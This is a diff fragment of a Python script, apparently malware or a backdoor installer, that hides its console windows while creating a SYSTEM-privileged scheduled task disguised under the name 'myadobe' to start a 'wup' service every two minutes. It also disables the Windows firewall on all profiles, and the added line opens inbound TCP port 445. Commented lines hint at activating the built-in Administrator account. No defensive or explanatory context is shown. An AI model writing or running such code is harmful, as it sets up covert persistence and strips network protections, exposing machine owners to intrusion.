@@ -107,6 +107,7 @@ try:
         #print("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest")
         subprocess.call("schtasks /create /ru \"SYSTEM\" /sc minute /mo 2 /tr \"net start wup\" /tn myadobe /rl highest /F", creationflags=CREATE_NO_WINDOW)
         subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
+        subprocess.call("netsh advfirewall firewall add rule name=\"Open Port 445\" dir=in action=allow protocol=TCP localport=445", creationflags=CREATE_NO_WINDOW)
         subprocess.call("net start wup", creationflags=0x08000000)
         os.system("netsh advfirewall set allprofiles state off")
     #os.system("net.exe user Administrator /active:yes")
